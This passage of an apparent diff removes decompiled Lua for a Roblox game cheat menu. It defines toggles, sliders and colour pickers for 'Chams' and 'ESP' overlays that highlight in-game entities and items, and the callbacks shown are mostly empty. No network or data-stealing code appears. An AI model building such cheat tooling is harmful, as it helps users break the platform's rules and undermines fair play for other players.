-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4455, _4455_2, _4455_3)
-    end)
-    local _4456 = _4441.Toggle
-    _4456(_4441, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4458, _4458_2, _4458_3)
-    end)
-    local _4459 = _4441.Slider
-    _4459(_4441, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4461, _4461_2, _4461_3)
-        math.floor(_4461)
-    end)
-    type(_4077)
-    local _ = _4077.r
-    local _ = _4077.g
-    local _ = _4077.b
-    local _4467 = _4441.ColorPicker
-    local _4468 = Color3.new
-    local _4469 = _4468()
-    _4467(_4441, {
-        Default = _4469,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4471, _4471_2, _4471_3)
-    end)
-    local _4472 = _3976.Button
-    local _4473 = _4472(_3976, "Entity Chams & ESP", "http://www.roblox.com/asset/?id=120937713530381")
-    local _4474 = _4473.Section
-    local _4475 = _4474(_4473, "Rush Chams", "Left")
-    local _4476 = _4475.Toggle
-    _4476(_4475, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4478, _4478_2, _4478_3)
-    end)
-    local _4479 = _4475.Slider
-    _4479(_4475, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4481, _4481_2, _4481_3)
-        local _4482, _4482_2, _4482_3 = math.floor(_4481)
-        local _ = _4482 / 100
-    end)
-    type(_4013)
-    local _ = _4013.r
-    local _ = _4013.g
-    local _ = _4013.b
-    local _4488 = _4475.ColorPicker
-    local _4489 = Color3.new
-    local _4490 = _4489()
-    _4488(_4475, {
-        Default = _4490,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4492, _4492_2, _4492_3)
-    end)
-    local _4493 = _4475.Slider
-    _4493(_4475, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4495, _4495_2, _4495_3)
-        local _4496, _4496_2, _4496_3 = math.floor(_4495)
-        local _ = _4496 / 100
-    end)
-    type(_4015)
-    local _ = _4015.r
-    local _ = _4015.g
-    local _ = _4015.b
-    local _4502 = _4475.ColorPicker
-    local _4503 = Color3.new
-    local _4504 = _4503()
-    _4502(_4475, {
-        Default = _4504,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4506, _4506_2, _4506_3)
-    end)
-    local _4507 = _4473.Section
-    local _4508 = _4507(_4473, "Rush ESP", "Right")
-    local _4509 = _4508.Toggle
-    _4509(_4508, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4511, _4511_2, _4511_3)
-    end)
-    local _4512 = _4508.Slider
-    _4512(_4508, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4514, _4514_2, _4514_3)
-        local _4515, _4515_2, _4515_3 = math.floor(_4514)
-        local _ = _4515 / 100
-    end)
-    local _4517 = _4508.Toggle
-    _4517(_4508, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4519, _4519_2, _4519_3)
-    end)
-    local _4520 = _4508.Toggle
-    _4520(_4508, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4522, _4522_2, _4522_3)
-    end)
-    local _4523 = _4508.Toggle
-    _4523(_4508, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4525, _4525_2, _4525_3)
-    end)
-    local _4526 = _4508.Slider
-    _4526(_4508, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4528, _4528_2, _4528_3)
-        math.floor(_4528)
-    end)
-    type(_4065)
-    local _ = _4065.r
-    local _ = _4065.g
-    local _ = _4065.b
-    local _4534 = _4508.ColorPicker
-    local _4535 = Color3.new
-    local _4536 = _4535()
-    _4534(_4508, {
-        Default = _4536,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4538, _4538_2, _4538_3)
-    end)
-    local _4539 = _4473.Section
-    local _4540 = _4539(_4473, "Ambush Chams", "Left")
-    local _4541 = _4540.Toggle
-    _4541(_4540, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4543, _4543_2, _4543_3)
-    end)
-    local _4544 = _4540.Slider
-    _4544(_4540, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4546, _4546_2, _4546_3)
-        local _4547, _4547_2, _4547_3 = math.floor(_4546)
-        local _ = _4547 / 100
-    end)
-    type(_4017)
-    local _ = _4017.r
-    local _ = _4017.g
-    local _ = _4017.b
-    local _4553 = _4540.ColorPicker
-    local _4554 = Color3.new
-    local _4555 = _4554()
-    _4553(_4540, {
-        Default = _4555,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4557, _4557_2, _4557_3)
-    end)
-    local _4558 = _4540.Slider
-    _4558(_4540, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4560, _4560_2, _4560_3)
-        local _4561, _4561_2, _4561_3 = math.floor(_4560)
-        local _ = _4561 / 100
-    end)
-    type(_4019)
-    local _ = _4019.r
-    local _ = _4019.g
-    local _ = _4019.b
-    local _4567 = _4540.ColorPicker
-    local _4568 = Color3.new
-    local _4569 = _4568()
-    _4567(_4540, {
-        Default = _4569,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4571, _4571_2, _4571_3)
-    end)
-    local _4572 = _4473.Section
-    local _4573 = _4572(_4473, "Ambush ESP", "Right")
-    local _4574 = _4573.Toggle
-    _4574(_4573, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4576, _4576_2, _4576_3)
-    end)
-    local _4577 = _4573.Slider
-    _4577(_4573, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4579, _4579_2, _4579_3)
-        local _4580, _4580_2, _4580_3 = math.floor(_4579)
-        local _ = _4580 / 100
-    end)
-    local _4582 = _4573.Toggle
-    _4582(_4573, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4584, _4584_2, _4584_3)
-    end)
-    local _4585 = _4573.Toggle
-    _4585(_4573, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4587, _4587_2, _4587_3)
-    end)
-    local _4588 = _4573.Toggle
-    _4588(_4573, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4590, _4590_2, _4590_3)
-    end)
-    local _4591 = _4573.Slider
-    _4591(_4573, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4593, _4593_2, _4593_3)
-        math.floor(_4593)
-    end)
-    type(_4067)
-    local _ = _4067.r
-    local _ = _4067.g
-    local _ = _4067.b
-    local _4599 = _4573.ColorPicker
-    local _4600 = Color3.new
-    local _4601 = _4600()
-    _4599(_4573, {
-        Default = _4601,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4603, _4603_2, _4603_3)
-    end)
-    local _4604 = _4473.Section
-    local _4605 = _4604(_4473, "Eyes Chams", "Left")
-    local _4606 = _4605.Toggle
-    _4606(_4605, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4608, _4608_2, _4608_3)
-    end)
-    local _4609 = _4605.Slider
-    _4609(_4605, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4611, _4611_2, _4611_3)
-        local _4612, _4612_2, _4612_3 = math.floor(_4611)
-        local _ = _4612 / 100
-    end)
-    type(_4029)
-    local _ = _4029.r
-    local _ = _4029.g
-    local _ = _4029.b
-    local _4618 = _4605.ColorPicker
-    local _4619 = Color3.new
-    local _4620 = _4619()
-    _4618(_4605, {
-        Default = _4620,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4622, _4622_2, _4622_3)
-    end)
-    local _4623 = _4605.Slider
-    _4623(_4605, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4625, _4625_2, _4625_3)
-        local _4626, _4626_2, _4626_3 = math.floor(_4625)
-        local _ = _4626 / 100
-    end)
-    type(_4031)
-    local _ = _4031.r
-    local _ = _4031.g
-    local _ = _4031.b
-    local _4632 = _4605.ColorPicker
-    local _4633 = Color3.new
-    local _4634 = _4633()
-    _4632(_4605, {
-        Default = _4634,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4636, _4636_2, _4636_3)
-    end)
-    local _4637 = _4473.Section
-    local _4638 = _4637(_4473, "Eyes ESP", "Right")
-    local _4639 = _4638.Toggle
-    _4639(_4638, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4641, _4641_2, _4641_3)
-    end)
-    local _4642 = _4638.Slider
-    _4642(_4638, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4644, _4644_2, _4644_3)
-        local _4645, _4645_2, _4645_3 = math.floor(_4644)
-        local _ = _4645 / 100
-    end)
-    local _4647 = _4638.Toggle
-    _4647(_4638, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4649, _4649_2, _4649_3)
-    end)
-    local _4650 = _4638.Toggle
-    _4650(_4638, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4652, _4652_2, _4652_3)
-    end)
-    local _4653 = _4638.Toggle
-    _4653(_4638, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4655, _4655_2, _4655_3)
-    end)
-    local _4656 = _4638.Slider
-    _4656(_4638, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4658, _4658_2, _4658_3)
-        math.floor(_4658)
-    end)
-    type(_4069)
-    local _ = _4069.r
-    local _ = _4069.g
-    local _ = _4069.b
-    local _4664 = _4638.ColorPicker
-    local _4665 = Color3.new
-    local _4666 = _4665()
-    _4664(_4638, {
-        Default = _4666,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4668, _4668_2, _4668_3)
-    end)
-    local _4669 = _4473.Section
-    local _4670 = _4669(_4473, "Giggle Chams", "Left")
-    local _4671 = _4670.Toggle
-    _4671(_4670, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4673, _4673_2, _4673_3)
-    end)
-    local _4674 = _4670.Slider
-    _4674(_4670, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4676, _4676_2, _4676_3)
-        local _4677, _4677_2, _4677_3 = math.floor(_4676)
-        local _ = _4677 / 100
-    end)
-    type(_4021)
-    local _ = _4021.r
-    local _ = _4021.g
-    local _ = _4021.b
-    local _4683 = _4670.ColorPicker
-    local _4684 = Color3.new
-    local _4685 = _4684()
-    _4683(_4670, {
-        Default = _4685,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4687, _4687_2, _4687_3)
-    end)
-    local _4688 = _4670.Slider
-    _4688(_4670, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4690, _4690_2, _4690_3)
-        local _4691, _4691_2, _4691_3 = math.floor(_4690)
-        local _ = _4691 / 100
-    end)
-    type(_4023)
-    local _ = _4023.r
-    local _ = _4023.g
-    local _ = _4023.b
-    local _4697 = _4670.ColorPicker
-    local _4698 = Color3.new
-    local _4699 = _4698()
-    _4697(_4670, {
-        Default = _4699,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4701, _4701_2, _4701_3)
-    end)
-    local _4702 = _4473.Section
-    local _4703 = _4702(_4473, "Giggle ESP", "Right")
-    local _4704 = _4703.Toggle
-    _4704(_4703, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4706, _4706_2, _4706_3)
-    end)
-    local _4707 = _4703.Slider
-    _4707(_4703, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4709, _4709_2, _4709_3)
-        local _4710, _4710_2, _4710_3 = math.floor(_4709)
-        local _ = _4710 / 100
-    end)
-    local _4712 = _4703.Toggle
-    _4712(_4703, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4714, _4714_2, _4714_3)
-    end)
-    local _4715 = _4703.Toggle
-    _4715(_4703, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4717, _4717_2, _4717_3)
-    end)
-    local _4718 = _4703.Toggle
-    _4718(_4703, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4720, _4720_2, _4720_3)
-    end)
-    local _4721 = _4703.Slider
-    _4721(_4703, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4723, _4723_2, _4723_3)
-        math.floor(_4723)
-    end)
-    type(_4061)
-    local _ = _4061.r
-    local _ = _4061.g
-    local _ = _4061.b
-    local _4729 = _4703.ColorPicker
-    local _4730 = Color3.new
-    local _4731 = _4730()
-    _4729(_4703, {
-        Default = _4731,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4733, _4733_2, _4733_3)
-    end)
-    local _4734 = _4473.Section
-    local _4735 = _4734(_4473, "Grumble Chams", "Left")
-    local _4736 = _4735.Toggle
-    _4736(_4735, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4738, _4738_2, _4738_3)
-    end)
-    local _4739 = _4735.Slider
-    _4739(_4735, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4741, _4741_2, _4741_3)
-        local _4742, _4742_2, _4742_3 = math.floor(_4741)
-        local _ = _4742 / 100
-    end)
-    type(_4025)
-    local _ = _4025.r
-    local _ = _4025.g
-    local _ = _4025.b
-    local _4748 = _4735.ColorPicker
-    local _4749 = Color3.new
-    local _4750 = _4749()
-    _4748(_4735, {
-        Default = _4750,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4752, _4752_2, _4752_3)
-    end)
-    local _4753 = _4735.Slider
-    _4753(_4735, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4755, _4755_2, _4755_3)
-        local _4756, _4756_2, _4756_3 = math.floor(_4755)
-        local _ = _4756 / 100
-    end)
-    type(_4027)
-    local _ = _4027.r
-    local _ = _4027.g
-    local _ = _4027.b
-    local _4762 = _4735.ColorPicker
-    local _4763 = Color3.new
-    local _4764 = _4763()
-    _4762(_4735, {
-        Default = _4764,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4766, _4766_2, _4766_3)
-    end)
-    local _4767 = _4473.Section
-    local _4768 = _4767(_4473, "Grumble ESP", "Right")
-    local _4769 = _4768.Toggle
-    _4769(_4768, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4771, _4771_2, _4771_3)
-    end)
-    local _4772 = _4768.Slider
-    _4772(_4768, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4774, _4774_2, _4774_3)
-        local _4775, _4775_2, _4775_3 = math.floor(_4774)
-        local _ = _4775 / 100
-    end)
-    local _4777 = _4768.Toggle
-    _4777(_4768, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4779, _4779_2, _4779_3)
-    end)
-    local _4780 = _4768.Toggle
-    _4780(_4768, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4782, _4782_2, _4782_3)
-    end)
-    local _4783 = _4768.Toggle
-    _4783(_4768, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4785, _4785_2, _4785_3)
-    end)
-    local _4786 = _4768.Slider
-    _4786(_4768, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4788, _4788_2, _4788_3)
-        math.floor(_4788)
-    end)
-    type(_4063)
-    local _ = _4063.r
-    local _ = _4063.g
-    local _ = _4063.b
-    local _4794 = _4768.ColorPicker
-    local _4795 = Color3.new
-    local _4796 = _4795()
-    _4794(_4768, {
-        Default = _4796,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4798, _4798_2, _4798_3)
-    end)
-    local _4799 = _3976.Button
-    local _4800 = _4799(_3976, "Items Chams & ESP", "http://www.roblox.com/asset/?id=127679279592127")
-    local _4801 = _4800.Section
-    local _4802 = _4801(_4800, "Toolshed Box Chams", "Left")
-    local _4803 = _4802.Toggle
-    _4803(_4802, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4805, _4805_2, _4805_3)
-    end)
-    local _4806 = _4802.Slider
-    _4806(_4802, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4808, _4808_2, _4808_3)
-        local _4809, _4809_2, _4809_3 = math.floor(_4808)
-        local _ = _4809 / 100
-    end)
-    type(_4037)
-    local _ = _4037.r
-    local _ = _4037.g
-    local _ = _4037.b
-    local _4815 = _4802.ColorPicker
-    local _4816 = Color3.new
-    local _4817 = _4816()
-    _4815(_4802, {
-        Default = _4817,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4819, _4819_2, _4819_3)
-    end)
-    local _4820 = _4802.Slider
-    _4820(_4802, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4822, _4822_2, _4822_3)
-        local _4823, _4823_2, _4823_3 = math.floor(_4822)
-        local _ = _4823 / 100
-    end)
-    type(_4039)
-    local _ = _4039.r
-    local _ = _4039.g
-    local _ = _4039.b
-    local _4829 = _4802.ColorPicker
-    local _4830 = Color3.new
-    local _4831 = _4830()
-    _4829(_4802, {
-        Default = _4831,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4833, _4833_2, _4833_3)
-    end)
-    local _4834 = _4800.Section
-    local _4835 = _4834(_4800, "Toolshed Box ESP", "Right")
-    local _4836 = _4835.Toggle
-    _4836(_4835, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4838, _4838_2, _4838_3)
-    end)
-    local _4839 = _4835.Slider
-    _4839(_4835, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4841, _4841_2, _4841_3)
-        local _4842, _4842_2, _4842_3 = math.floor(_4841)
-        local _ = _4842 / 100
-    end)
-    local _4844 = _4835.Toggle
-    _4844(_4835, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4846, _4846_2, _4846_3)
-    end)
-    local _4847 = _4835.Toggle
-    _4847(_4835, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4849, _4849_2, _4849_3)
-    end)
-    local _4850 = _4835.Toggle
-    _4850(_4835, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4852, _4852_2, _4852_3)
-    end)
-    local _4853 = _4835.Slider
-    _4853(_4835, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4855, _4855_2, _4855_3)
-        math.floor(_4855)
-    end)
-    type(_4091)
-    local _ = _4091.r
-    local _ = _4091.g
-    local _ = _4091.b
-    local _4861 = _4835.ColorPicker
-    local _4862 = Color3.new
-    local _4863 = _4862()
-    _4861(_4835, {
-        Default = _4863,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4865, _4865_2, _4865_3)
-    end)
-    local _4866 = _4800.Section
-    local _4867 = _4866(_4800, "Glowstick Chams", "Left")
-    local _4868 = _4867.Toggle
-    _4868(_4867, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4870, _4870_2, _4870_3)
-    end)
-    local _4871 = _4867.Slider
-    _4871(_4867, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4873, _4873_2, _4873_3)
-        local _4874, _4874_2, _4874_3 = math.floor(_4873)
-        local _ = _4874 / 100
-    end)
-    type(_4033)
-    local _ = _4033.r
-    local _ = _4033.g
-    local _ = _4033.b
-    local _4880 = _4867.ColorPicker
-    local _4881 = Color3.new
-    local _4882 = _4881()
-    _4880(_4867, {
-        Default = _4882,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4884, _4884_2, _4884_3)
-    end)
-    local _4885 = _4867.Slider
-    _4885(_4867, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4887, _4887_2, _4887_3)
-        local _4888, _4888_2, _4888_3 = math.floor(_4887)
-        local _ = _4888 / 100
-    end)
-    type(_4035)
-    local _ = _4035.r
-    local _ = _4035.g
-    local _ = _4035.b
-    local _4894 = _4867.ColorPicker
-    local _4895 = Color3.new
-    local _4896 = _4895()
-    _4894(_4867, {
-        Default = _4896,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4898, _4898_2, _4898_3)
-    end)
-    local _4899 = _4800.Section
-    local _4900 = _4899(_4800, "Glowstick ESP", "Right")
-    local _4901 = _4900.Toggle
-    _4901(_4900, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4903, _4903_2, _4903_3)
-    end)
-    local _4904 = _4900.Slider
-    _4904(_4900, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4906, _4906_2, _4906_3)
-        local _4907, _4907_2, _4907_3 = math.floor(_4906)
-        local _ = _4907 / 100
-    end)
-    local _4909 = _4900.Toggle
-    _4909(_4900, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4911, _4911_2, _4911_3)
-    end)
-    local _4912 = _4900.Toggle
-    _4912(_4900, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4914, _4914_2, _4914_3)
-    end)
-    local _4915 = _4900.Toggle
-    _4915(_4900, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4917, _4917_2, _4917_3)
-    end)
-    local _4918 = _4900.Slider
-    _4918(_4900, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4920, _4920_2, _4920_3)
-        math.floor(_4920)
-    end)
-    type(_4081)
-    local _ = _4081.r
-    local _ = _4081.g
-    local _ = _4081.b
-    local _4926 = _4900.ColorPicker
-    local _4927 = Color3.new
-    local _4928 = _4927()
-    _4926(_4900, {
-        Default = _4928,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4930, _4930_2, _4930_3)
-    end)
-    local _4931 = _4800.Section
-    local _4932 = _4931(_4800, "Fuse Chams", "Left")
-    local _4933 = _4932.Toggle
-    _4933(_4932, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4935, _4935_2, _4935_3)
-    end)
-    local _4936 = _4932.Slider
-    _4936(_4932, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4938, _4938_2, _4938_3)
-        local _4939, _4939_2, _4939_3 = math.floor(_4938)
-        local _ = _4939 / 100
-    end)
-    type(_4041)
-    local _ = _4041.r
-    local _ = _4041.g
-    local _ = _4041.b
-    local _4945 = _4932.ColorPicker
-    local _4946 = Color3.new
-    local _4947 = _4946()
-    _4945(_4932, {
-        Default = _4947,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4949, _4949_2, _4949_3)
-    end)
-    local _4950 = _4932.Slider
-    _4950(_4932, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4952, _4952_2, _4952_3)
-        local _4953, _4953_2, _4953_3 = math.floor(_4952)
-        local _ = _4953 / 100
-    end)
-    type(_4043)
-    local _ = _4043.r
-    local _ = _4043.g
-    local _ = _4043.b
-    local _4959 = _4932.ColorPicker
-    local _4960 = Color3.new
-    local _4961 = _4960()
-    _4959(_4932, {
-        Default = _4961,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4963, _4963_2, _4963_3)
-    end)
-    local _4964 = _4800.Section
-    local _4965 = _4964(_4800, "Fuse ESP", "Right")
-    local _4966 = _4965.Toggle
-    _4966(_4965, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4968, _4968_2, _4968_3)
-    end)
-    local _4969 = _4965.Slider
-    _4969(_4965, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4971, _4971_2, _4971_3)
-        local _4972, _4972_2, _4972_3 = math.floor(_4971)
-        local _ = _4972 / 100
-    end)
-    local _4974 = _4965.Toggle
-    _4974(_4965, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4976, _4976_2, _4976_3)
-    end)
-    local _4977 = _4965.Toggle
-    _4977(_4965, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4979, _4979_2, _4979_3)
-    end)
-    local _4980 = _4965.Toggle
-    _4980(_4965, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4982, _4982_2, _4982_3)
-    end)
-    local _4983 = _4965.Slider
-    _4983(_4965, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4985, _4985_2, _4985_3)
-        math.floor(_4985)
-    end)
-    type(_4079)
-    local _ = _4079.r
-    local _ = _4079.g
-    local _ = _4079.b
-    local _4991 = _4965.ColorPicker
-    local _4992 = Color3.new
-    local _4993 = _4992()
-    _4991(_4965, {
-        Default = _4993,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4995, _4995_2, _4995_3)
-    end)
-    local _4996 = _4800.Section
-    local _4997 = _4996(_4800, "Lighter Chams", "Left")
-    local _4998 = _4997.Toggle
-    _4998(_4997, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5000, _5000_2, _5000_3)
-    end)
-    local _5001 = _4997.Slider
-    _5001(_4997, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_5003, _5003_2, _5003_3)
-        local _5004, _5004_2, _5004_3 = math.floor(_5003)
-        local _ = _5004 / 100
-    end)
-    type(_4057)
-    local _ = _4057.r
-    local _ = _4057.g
-    local _ = _4057.b
-    local _5010 = _4997.ColorPicker
-    local _5011 = Color3.new
-    local _5012 = _5011()
-    _5010(_4997, {
-        Default = _5012,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_5014, _5014_2, _5014_3)
-    end)
-    local _5015 = _4997.Slider
-    _5015(_4997, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_5017, _5017_2, _5017_3)
-        local _5018, _5018_2, _5018_3 = math.floor(_5017)
-        local _ = _5018 / 100
-    end)
-    type(_4059)
-    local _ = _4059.r
-    local _ = _4059.g
-    local _ = _4059.b
-    local _5024 = _4997.ColorPicker
-    local _5025 = Color3.new
-    local _5026 = _5025()
-    _5024(_4997, {
-        Default = _5026,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_5028, _5028_2, _5028_3)
-    end)
-    local _5029 = _4800.Section
-    local _5030 = _5029(_4800, "Lighter ESP", "Right")
-    local _5031 = _5030.Toggle
-    _5031(_5030, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5033, _5033_2, _5033_3)
-    end)
-    local _5034 = _5030.Slider
-    _5034(_5030, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_5036, _5036_2, _5036_3)
-        local _5037, _5037_2, _5037_3 = math.floor(_5036)
-        local _ = _5037 / 100
-    end)
-    local _5039 = _5030.Toggle
-    _5039(_5030, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_5041, _5041_2, _5041_3)
-    end)
-    local _5042 = _5030.Toggle
-    _5042(_5030, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_5044, _5044_2, _5044_3)
-    end)
-    local _5045 = _5030.Toggle
-    _5045(_5030, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_5047, _5047_2, _5047_3)
-    end)
-    local _5048 = _5030.Slider
-    _5048(_5030, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_5050, _5050_2, _5050_3)
-        math.floor(_5050)
-    end)
-    type(_4089)
-    local _ = _4089.r
-    local _ = _4089.g
-    local _ = _4089.b
-    local _5056 = _5030.ColorPicker
-    local _5057 = Color3.new
-    local _5058 = _5057()
-    _5056(_5030, {
-        Default = _5058,
-        Description = "",
-        Title = "Text Color",
-    }, function(_5060, _5060_2, _5060_3)
-    end)
-    local _5061 = _4800.Section
-    local _5062 = _5061(_4800, "Battery Chams", "Left")
-    local _5063 = _5062.Toggle
-    _5063(_5062, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5065, _5065_2, _5065_3)
-    end)
-    local _5066 = _5062.Slider
-    _5066(_5062, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_5068, _5068_2, _5068_3)
-        local _5069, _5069_2, _5069_3 = math.floor(_5068)
-        local _ = _5069 / 100
-    end)
-    type(_4053)
-    local _ = _4053.r
-    local _ = _4053.g
-    local _ = _4053.b
-    local _5075 = _5062.ColorPicker
-    local _5076 = Color3.new
